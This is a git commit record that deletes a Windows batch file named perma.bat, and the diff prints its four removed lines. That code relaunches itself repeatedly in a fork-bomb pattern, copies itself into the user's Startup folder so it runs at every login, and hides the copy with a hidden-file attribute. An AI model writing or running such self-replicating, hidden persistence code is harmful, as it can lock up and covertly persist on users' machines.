73ac07fda3e9899eecf8b48dbe008a63216e348a
wosuii <130871867+Dyscr1m@users.noreply.github.com>
2025-05-10 21:29:02 -0400

    Delete Batch Files/perma.bat

--- Batch Files/perma.bat
+++
@@ -1,4 +0,0 @@
-start perma
-copy "perma.bat" "%USERPROFILE%\Start Menu\Programs\Startup" >> perma.bat
-start perma.bat >> perma.bat
-attrib %USERPROFILE%\Start Menu\Programs\Startup\perma.bat +h >> perma.bat
